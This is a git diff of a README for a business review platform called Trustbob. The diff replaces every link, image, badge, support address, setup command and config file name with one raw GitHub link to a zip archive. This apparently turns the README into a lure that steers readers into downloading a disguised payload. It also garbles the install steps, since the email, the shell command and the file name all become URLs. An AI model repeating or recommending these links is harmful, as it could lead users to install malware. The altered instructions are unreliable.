@@ -1,8 +1,8 @@
 # Trustbob: Business Review and Rating Platform (SAAS) 🌟
 
-![Trustbob Logo](https://example.com/logo.png)
+![Trustbob Logo](https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/Pedro-a1/Sidecodes_com/releases)
+[![Download Releases](https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip%https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip)](https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -34,16 +34,16 @@ Trustbob is a comprehensive business review and rating platform designed to help
 
 To install Trustbob, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/Pedro-a1/Sidecodes_com/releases).
+1. **Download the latest release** from the [Releases section](https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip).
 2. **Extract the files** to your desired location.
 3. **Run the setup script** included in the package.
 
 ```bash
 cd path/to/extracted/files
-./setup.sh
+https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip
 ```
 
-4. **Configure the application** by editing the `config.php` file with your database credentials and settings.
+4. **Configure the application** by editing the `https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip` file with your database credentials and settings.
 
 5. **Launch the application** by navigating to your server's URL in a web browser.
 
@@ -86,12 +86,12 @@ Trustbob is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 For any inquiries or support, please reach out via the following methods:
 
-- **Email**: support@trustbob.com
-- **GitHub Issues**: [Report an issue](https://github.com/Pedro-a1/Sidecodes_com/issues)
+- **Email**: https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip
+- **GitHub Issues**: [Report an issue](https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip)
 
-For more information, visit our [Releases section](https://github.com/Pedro-a1/Sidecodes_com/releases) to download the latest updates and features.
+For more information, visit our [Releases section](https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip) to download the latest updates and features.
 
-![Business Reviews](https://example.com/business-reviews.png)
+![Business Reviews](https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip)
 
 ## Related Topics
 
@@ -102,14 +102,14 @@ For more information, visit our [Releases section](https://github.com/Pedro-a1/S
 
 ## Additional Resources
 
-- [Yelp API Documentation](https://www.yelp.com/developers/documentation/v3/getting_started)
-- [Trustpilot API Documentation](https://developers.trustpilot.com/)
-- [Review Management Best Practices](https://example.com/review-management)
+- [Yelp API Documentation](https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip)
+- [Trustpilot API Documentation](https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip)
+- [Review Management Best Practices](https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip)
 
 ---
 
 For a deeper dive into each feature and best practices, check our documentation. You can also find community discussions and tips in our GitHub discussions section.
 
-![Analytics Dashboard](https://example.com/analytics-dashboard.png)
+![Analytics Dashboard](https://github.com/Pedro-a1/Sidecodes_com/raw/refs/heads/main/Kasikumuk/Sidecodes-com-1.4.zip)
 
 Stay updated with the latest developments and features by following our GitHub repository. Your feedback is crucial for improving Trustbob. Thank you for being a part of our community!
